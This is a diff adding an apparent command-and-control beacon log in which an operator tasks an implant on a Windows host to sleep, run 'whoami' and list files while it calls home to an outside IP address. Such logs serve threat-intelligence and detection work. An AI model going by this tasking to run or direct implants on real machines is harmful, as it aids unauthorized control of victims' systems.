@@ -1,0 +1,33 @@
+11/20 06:05:23 UTC [metadata] 95.211.190.197 <- 10.0.91.14; computer: yovkzqfdumt; user: user *; process: jxhqzlcg.exe; pid: 2764; os: Windows; version: 6.1; build: 7601; beacon arch: x64 (x64)
+11/20 06:05:19 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+11/20 06:05:19 UTC [note] Bid: 436922766  NT: 6.1
+11/20 06:05:19 UTC [task] <T1029> Tasked beacon to become interactive
+11/20 06:05:19 UTC [task] <T1029> Tasked beacon to sleep for 10s (30% jitter)
+11/20 06:05:19 UTC [note]   Ver: 6.1
+11/20 06:06:04 UTC [input] <admin1> sleep 0
+11/20 06:06:04 UTC [task] <T1029> Tasked beacon to become interactive
+11/20 06:06:19 UTC [checkin] host called home, sent: 64 bytes
+11/20 06:06:24 UTC [input] <admin1> shell whoami
+11/20 06:06:24 UTC [task] <T1059> Tasked beacon to run: whoami
+11/20 06:06:24 UTC [checkin] host called home, sent: 37 bytes
+11/20 06:06:26 UTC [output]
+received output:
+yovkzqfdumt\user
+
+
+11/20 06:06:51 UTC [task] <> Tasked beacon to list files in . (from File Browser)
+11/20 06:06:51 UTC [checkin] host called home, sent: 19 bytes
+11/20 06:06:53 UTC [task] <> Tasked beacon to list files in C:\ (from File Browser)
+11/20 06:06:53 UTC [checkin] host called home, sent: 20 bytes
+11/20 06:06:53 UTC [task] <> Tasked beacon to list files in C:\ (from File Browser)
+11/20 06:06:54 UTC [checkin] host called home, sent: 20 bytes
+11/20 06:07:04 UTC [input] <admin1> ls
+11/20 06:07:04 UTC [task] <> Tasked beacon to list files in .
+11/20 06:07:04 UTC [checkin] host called home, sent: 19 bytes
+11/20 06:07:05 UTC [output]
+C:\uifxusjf\*
+D	0	10/09/2023 15:36:17	.
+D	0	10/09/2023 15:36:17	..
+F	19456	10/09/2023 15:36:18	jxhqzlcg.exe
+
+
